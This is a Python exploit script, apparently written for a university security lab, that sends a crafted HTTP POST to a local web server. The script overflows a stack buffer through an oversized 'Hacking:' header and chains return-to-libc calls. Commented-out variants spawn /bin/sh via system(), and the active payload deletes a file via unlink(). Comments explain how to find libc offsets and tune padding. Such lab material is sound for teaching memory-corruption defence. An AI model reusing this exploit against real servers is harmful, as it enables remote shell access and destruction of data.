#!/usr/bin/python3
import sys
import socket
import traceback
import struct
import time
import os.path
import binascii
from pwn import *

# libc base address
# ASLR should be off, so that libc's base address will not change untill next reboot .
base_addr = 0xf7da8000

# All of the offsets of functions (strings) inside libc won't change much (sometimes changed, so check is needed).
# To get the offset of a funtion:
##  readelf -a /lib/i386-linux-gnu/libc.so.6 | grep "system"
# To get the offset of string "/bin/sh":
##  ropper --file /lib/i386-linux-gnu/libc.so.6 --string "/bin/sh"
system_addr = base_addr + 0x00044d00
sh_str_addr = base_addr + 0x0018fb62
exit_addr   = base_addr + 0x00037680
unlink_addr = base_addr + 0x000f3f60
remove_addr = base_addr + 0x00054d10
chdir_addr  = base_addr + 0x000f2ba0
chroot_addr = base_addr + 0x000fd810
puts_addr   = base_addr + 0x0006f4e0

# ebp too make the task simple, we print ebp of getToken function (vulnerable) 
ebp_addr = 0xffffd1f8

## Below is the function that you should modify to construct an
## HTTP request that will cause a buffer overflow in some part
## of the vulnerable web server and exploit it.

def build_exploit(shellcode):

    # All of the header information other than "Content-Length" is not important
    req  = ("POST / HTTP/1.1\r\n").encode('latin-1')
    req += ("Host: 127.0.0.1\r\n").encode('latin-1')
    # The Content-Length below is useful, and depends on the length of username + password, 
    ##  you need to use wireshark (together with web browser) for checking the length.
    req += ("Content-Length: 64\r\n").encode('latin-1')
    req += ("Origin: http://127.0.0.1\r\n").encode('latin-1')
    req += ("Connection: keep-alive\r\n").encode('latin-1')
    req += ("Referer: http://127.0.0.1/\r\n").encode('latin-1')

    # For different oses (and compilation), the length of fillup for 
    # hijacking the return address in the stack, could be different,
    # therefore you need to debug the program for checking and adjusting.
    req += ("Hacking: ").encode('latin-1')

    # 1 - This causes the server Segment Fault with IP = 0x43434343, which
    ##    means the return address is covered with 'CCCC'.
    # req += b'A' * 1068 + b'C' * 4

    # 2.1 - Use "/bin/sh" string in libc to enter shell.
    # req += b'XBA' * 356
    # req += p32(system_addr)
    # req += p32(exit_addr)
    # req += p32(sh_str_addr)
    # req += p32(0)

    # 2.2 - Put "/bin/sh" string in the stack to enter shell.
    ##      EBP is needed to locate the place of string.
    ##      Note: using this method, you can put arbitrary string in the stack, 
    ##      so that "system" can execute arbitrary command
    # system_arg = "/bin/sh\0"
    # system_arg_addr = ebp_addr + 20
    # req += b'XBA' * 356
    # req += p32(system_addr)
    # req += p32(exit_addr)
    # req += p32(system_arg_addr)
    # req += p32(0)
    # req += system_arg.encode('latin-1')

    # 3 - Remove a file specified by the path "unlink_arg" by the function unlink().
    unlink_arg = "/tmp/test.txt\0"
    unlink_arg_addr = ebp_addr + 20
    req += b'XBA' * 356
    req += p32(unlink_addr)
    req += p32(exit_addr)
    req += p32(unlink_arg_addr)
    req += p32(0)
    req += unlink_arg.encode('latin-1')
    
    # The end of header line "Hacking: xxxxx".
    req += ("\r\n").encode('latin-1')

    # The blank line between headers and body.
    req += ("\r\n").encode('latin-1')
   
    # Below is the username/password that you can Register into the web server
    # by using web browser. These information will be stored into the sqlite db behind.
    # You need to change these information according to your own registration.
 
    # Note that successful POST will be responded by the server with a hint page.
    # By using the successful response, you can judge whether the server has been 
    # crashed (by exploit), so that you can adjust the fillup accordingly.
    req += ("login_username=xubiang&login_password=xubiang&submit_login=Login").encode('latin-1')

    # print(req)
    return req


def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ("").encode("latin-1")
    while len(rbuf):
        resp = resp + rbuf
        rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp


if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellcode = ""
    if(os.path.exists("shellcode.bin")):
        shellfile = open("shellcode.bin", "r")
        shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:", req)
    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:", resp)
except:
    print("Exception:", traceback.format_exc())
